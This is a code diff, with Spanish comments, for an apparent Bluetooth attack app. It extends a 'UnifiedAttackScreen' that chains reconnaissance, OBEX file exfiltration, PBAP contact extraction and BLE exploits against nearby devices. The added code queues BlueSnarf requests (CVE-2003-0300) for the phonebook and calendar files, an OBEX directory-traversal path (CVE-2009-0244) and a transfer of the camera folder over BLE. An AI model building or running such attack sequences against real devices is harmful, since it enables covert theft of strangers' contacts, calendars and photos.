@@ -261,16 +261,20 @@ class _UnifiedAttackScreenState extends State<UnifiedAttackScreen> with SingleTi
   static const _defaultMaxRetries = 2;
   static const _defaultRetryDelay = 2000; // 2s
 
-  static const Map<String, Map<String, int>> _attackConfigs = {
-    // Reconocimiento
-    'sdp_discover': {'timeout': 5000, 'retries': 1, 'delay': 1000},
-    'full_scan': {'timeout': 10000, 'retries': 2, 'delay': 2000},
-    'mediastore_enumerate': {'timeout': 8000, 'retries': 1, 'delay': 1000},
-    // Extracción OBEX
-    'file_exfil': {'timeout': 15000, 'retries': 2, 'delay': 3000},
-    'file_exfil_dir': {'timeout': 20000, 'retries': 2, 'delay': 3000},
-    'pbap_extract': {'timeout': 30000, 'retries': 2, 'delay': 3000},
-    // BLE exploits
+   static const Map<String, Map<String, int>> _attackConfigs = {
+     // Reconocimiento
+     'sdp_discover': {'timeout': 5000, 'retries': 1, 'delay': 1000},
+     'full_scan': {'timeout': 10000, 'retries': 2, 'delay': 2000},
+     'mediastore_enumerate': {'timeout': 8000, 'retries': 1, 'delay': 1000},
+     // Extracción OBEX
+     'file_exfil': {'timeout': 15000, 'retries': 2, 'delay': 3000},
+     'file_exfil_dir': {'timeout': 20000, 'retries': 2, 'delay': 3000},
+     'pbap_extract': {'timeout': 30000, 'retries': 2, 'delay': 3000},
+     // Bluesnarf (OBEX GET) - CVE-2003-0300
+     'obex_get': {'timeout': 15000, 'retries': 2, 'delay': 3000},
+     // OBEX over BLE (modern)
+     'obex_ble_transfer': {'timeout': 20000, 'retries': 2, 'delay': 3000},
+     // BLE exploits
     'btlejack': {'timeout': 15000, 'retries': 2, 'delay': 2000},
     'blur_attack': {'timeout': 8000, 'retries': 2, 'delay': 2000},
     'sweyntooth_attack': {'timeout': 8000, 'retries': 2, 'delay': 2000},
@@ -603,17 +607,31 @@ class _UnifiedAttackScreenState extends State<UnifiedAttackScreen> with SingleTi
        }
      }
 
-     // PBAP para smartphones/tablets/Android/unknown
-     if (deviceType_lower.contains('smartphone') || 
-         deviceType_lower.contains('tablet') || 
-         hasAndroid || 
-         isDataCapable) {
-       sequence.add({'type': 'pbap_extract', 'command': 'all', 'name': 'PBAP_ALL', 'phase': 2, 'timeout': 30000, 'retries': 2});
-     }
+      // PBAP para smartphones/tablets/Android/unknown
+      if (deviceType_lower.contains('smartphone') ||
+          deviceType_lower.contains('tablet') ||
+          hasAndroid ||
+          isDataCapable) {
+        sequence.add({'type': 'pbap_extract', 'command': 'all', 'name': 'PBAP_ALL', 'phase': 2, 'timeout': 30000, 'retries': 2});
+      }
 
-     // ==========================================
-     // FASE 3: BLE EXPLOITS (paralelo, si tiene BLE)
-     // ==========================================
+      // ===== BLUESNARF (OBEX GET) - extracción directa de archivos OBEX sin autenticación =====
+      // CVE-2003-0300: BlueSnarf - acceso a telecom/pb.vcf y telecom/cal.vcf
+      if (shouldTryObex) {
+        sequence.add({'type': 'obex_get', 'command': 'telecom/pb.vcf', 'name': 'BLUESNARF_PB', 'cve': 'CVE-2003-0300', 'phase': 2, 'timeout': 15000, 'retries': 2});
+        sequence.add({'type': 'obex_get', 'command': 'telecom/cal.vcf', 'name': 'BLUESNARF_CAL', 'cve': 'CVE-2003-0300', 'phase': 2, 'timeout': 15000, 'retries': 2});
+        // Directory traversal OBEX (CVE-2009-0244)
+        sequence.add({'type': 'obex_get', 'command': '../..', 'name': 'OBEX_TRAVERSAL', 'cve': 'CVE-2009-0244', 'phase': 2, 'timeout': 15000, 'retries': 2});
+      }
+
+      // ===== OBEX OVER BLE (MODERNO) - transferencia via BLE GATT =====
+      if (deviceInfo['hasBle'] == true) {
+        sequence.add({'type': 'obex_ble_transfer', 'command': '/DCIM/Camera', 'name': 'OBEX_BLE_CAMERA', 'phase': 2, 'timeout': 20000, 'retries': 2});
+      }
+
+      // ==========================================
+      // FASE 3: BLE EXPLOITS (paralelo, si tiene BLE)
+      // ==========================================
      if (deviceInfo['hasBle'] == true || deviceType_lower.contains('wearable') || deviceType_lower.contains('car')) {
        // Escaneo BLE básico
        sequence.add({'type': 'btlejack', 'command': 'scan', 'name': 'BTLE_SCAN', 'phase': 3, 'timeout': 10000, 'retries': 2});
